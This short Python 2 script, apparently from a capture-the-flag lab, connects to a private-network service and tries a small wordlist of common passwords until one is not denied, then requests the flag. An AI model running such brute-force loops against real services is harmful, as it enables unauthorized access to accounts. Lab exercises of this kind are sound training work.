import socket


TCP_IP = '192.168.14.30'
TCP_PORT = 2005
BUFFER_SIZE = 1024
MESSAGE = "GET FLAG"
Dict = ["red", "blue", "gray", "purple", "elephant", "monkey", "lion", "tiger", "bear", "password", "hunter", "dog", "cat", "swordfish"]

for elem in Dict:
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                s.connect ((TCP_IP, TCP_PORT))
                print "Connect to 192.168.14.30"
                data = s.recv(BUFFER_SIZE)
                print elem
                s.send(elem)
                print 'b'
                data = s.recv(BUFFER_SIZE)

                print "received:", data
                x = data.find('ACCESS DENIED')
                print x
                if  x < 0:
                       s.send(MESSAGE)
                       break
                s.close()
while 1:
    data = s.recv(BUFFER_SIZE)
    if not data: break
    print "received:", data
s.close()

